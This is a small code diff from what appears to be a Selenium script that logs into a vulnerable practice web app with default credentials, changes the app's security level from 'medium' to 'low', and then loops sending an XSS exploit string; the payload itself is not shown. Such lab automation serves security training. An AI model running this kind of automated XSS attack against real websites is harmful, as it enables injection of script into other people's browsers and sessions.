@@ -64,7 +64,7 @@ if __name__ == "__main__":
 
     try:
         login(driver, LOGIN_ADDR, "admin", "password")
-        set_security_lvl(driver, SECURITY_LVL_ADDR, "medium")
+        set_security_lvl(driver, SECURITY_LVL_ADDR, "low")
         print("Ctrl + C to stop XSS")
         while True:
             send_exploit(driver, XSS_ADDR, EXPLOIT_STR)
